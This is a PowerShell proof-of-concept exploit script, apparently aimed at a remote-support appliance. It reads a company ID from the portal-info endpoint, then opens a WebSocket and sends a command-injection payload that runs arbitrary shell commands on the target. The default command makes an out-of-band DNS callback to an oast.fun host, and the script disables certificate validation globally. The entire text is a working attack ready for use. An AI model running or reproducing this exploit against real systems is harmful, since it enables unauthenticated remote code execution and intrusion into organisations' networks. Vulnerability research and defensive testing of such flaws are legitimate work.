# Setup: Ignore SSL errors for appliance management IPs
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

Function Invoke-BTRedTeamPoC {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$Target,
        [string]$Command = "nslookup XXXXXXXXXXXXXXXXXXX.oast.fun"
    )

    # 1. Reconnaissance: Extract Company ID
    $Url = "https://$Target/get_portal_info"
    try {
        $Info = (Invoke-WebRequest -Uri $Url -UseBasicParsing -TimeoutSec 5).Content
        if ($Info -match "company=([^;]+)") {
            $Company = $Matches[1].Trim()
            Write-Host "[+] Target: $Target | Company: $Company" -ForegroundColor Green
        } else {
            Write-Host "[-] Failed to extract Company ID from $Target" -ForegroundColor Red
            return
        }
    } catch {
        Write-Host "[-] Target unreachable: $Target" -ForegroundColor Red
        return
    }

    # 2. WebSocket Orchestration
    $WS = New-Object System.Net.WebSockets.ClientWebSocket
    $WS.Options.AddSubProtocol("ingredi support desk customer thin")
    $WS.Options.SetRequestHeader("X-Ns-Company", $Company)
    $WS.Options.SetRequestHeader("User-Agent", "Mozilla/5.0")

    $Uri = New-Object System.Uri("wss://$Target/nw")
    $CTS = New-Object System.Threading.CancellationTokenSource(10000) # 10s window

    try {
        # Establish Connection
        $ConnectTask = $WS.ConnectAsync($Uri, $CTS.Token)
        $ConnectTask.Wait()

        if ($WS.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            Write-Host "[*] Connection Open. Crafting Byte-Perfect Payload..." -ForegroundColor Cyan

            # 3. Payload Construction (Replacing echo -ne)
            # Must be LF (0x0A) delimited, not CRLF (0x0D 0x0A)
            $LF = [byte]0x0A
            $PayloadBody = "hax[`$($Command)]"
            $UUID        = "aaaaaaaa-aaaa-aaaa-aaaaaaaaaaaa"
            $Flag        = "0"
            $Junk        = "aaaa"

            $Encoding = [System.Text.Encoding]::ASCII
            $FinalBytes = $Encoding.GetBytes($PayloadBody) + $LF + 
                          $Encoding.GetBytes($UUID) + $LF + 
                          $Encoding.GetBytes($Flag) + $LF + 
                          $Encoding.GetBytes($Junk) + $LF

            $ByteSegment = New-Object System.ArraySegment[byte] -ArgumentList @(,$FinalBytes)

            # 4. Transmission
            $SendTask = $WS.SendAsync($ByteSegment, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $CTS.Token)
            $SendTask.Wait()

            Write-Host "[+] Exploit string sent as Binary Frame." -ForegroundColor Green
            
            # 5. Brief Listener (To confirm if the socket remains open or errors out)
            $RcvBuffer = New-Object byte[] 1024
            $RcvSegment = New-Object System.ArraySegment[byte] -ArgumentList @(,$RcvBuffer)
            $RcvTask = $WS.ReceiveAsync($RcvSegment, $CTS.Token)
            
            if ($RcvTask.Wait(3000)) {
                $Output = $Encoding.GetString($RcvBuffer, 0, $RcvTask.Result.Count)
                Write-Host "[*] Appliance Response: $Output" -ForegroundColor Gray
            }
        }
    } catch {
        Write-Host "[-] WebSocket Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
    } finally {
        if ($WS.State -eq 'Open') { $WS.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", $CTS.Token).Wait() }
        $WS.Dispose()
    }
}

# Usage:
# Invoke-BTRedTeamPoC -Target "192.168.1.100" -Command "id > /tmp/success"